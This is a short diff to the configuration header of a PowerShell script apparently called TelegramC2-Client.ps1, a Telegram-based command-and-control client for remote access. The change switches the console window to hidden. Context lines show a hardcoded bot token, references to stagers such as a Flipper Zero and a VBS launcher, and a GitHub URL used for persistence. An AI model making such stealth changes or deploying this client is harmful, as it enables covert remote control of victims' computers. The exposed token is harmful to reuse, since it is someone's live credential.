@@ -5,7 +5,7 @@
 $Token = "8773971348:AAH1rt2BDljZzyRZqdFCp5qv1BR3JDNBD78"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
-$HideWindow = 0 # HIDE THE WINDOW - Change to 1 to hide the console window
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window
 $version = "1.7.1" # Current Version
 $parent = "raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "api.telegram.org/bot$Token/sendMessage"
